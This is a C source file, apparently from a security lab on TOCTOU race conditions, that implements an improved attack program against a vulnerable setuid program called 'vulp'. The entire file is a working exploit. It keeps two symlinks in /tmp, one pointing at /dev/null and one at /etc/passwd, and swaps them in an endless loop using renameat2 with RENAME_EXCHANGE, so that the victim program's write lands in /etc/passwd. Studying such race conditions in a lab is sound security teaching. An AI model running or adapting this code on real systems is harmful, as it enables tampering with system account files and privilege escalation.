/*
 * attack_renameat2.c  -  Task 2C attack program (improved, atomic version).
 *
 * The weakness of the Task 2B attack is that unlink()+symlink() leaves a brief
 * instant in which /tmp/XYZ does not exist at all. During that instant vulp's
 * access() or fopen() can fail, wasting attempts.
 *
 * Here we instead pre-create BOTH symlinks once:
 *     /tmp/XYZ  -> /dev/null
 *     /tmp/ABC  -> /etc/passwd
 * and then repeatedly swap the two names ATOMICALLY with the renameat2()
 * system call using the RENAME_EXCHANGE flag. Because the exchange is atomic,
 * /tmp/XYZ is ALWAYS a valid symlink (either to /dev/null or to /etc/passwd) --
 * it is never missing. This removes the self-inflicted failures and makes the
 * attack succeed far more reliably and quickly.
 *
 * Build:  gcc attack_renameat2.c -o attack_renameat2
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <linux/fs.h>     /* RENAME_EXCHANGE */

int main()
{
	unsigned int flags = RENAME_EXCHANGE;

	/* Create the two competing links once. */
	unlink("/tmp/XYZ");
	symlink("/dev/null",   "/tmp/XYZ");

	unlink("/tmp/ABC");
	symlink("/etc/passwd", "/tmp/ABC");

	/* Atomically swap the two names forever. After each swap, /tmp/XYZ flips
	 * between pointing at /dev/null and pointing at /etc/passwd, but it is
	 * never in a non-existent state. */
	while (1) {
		int ret = syscall(SYS_renameat2,
		                  AT_FDCWD, "/tmp/XYZ",
		                  AT_FDCWD, "/tmp/ABC",
		                  flags);
		if (ret < 0) {
			perror("renameat2");
			return 1;
		}
	}

	return 0;
}
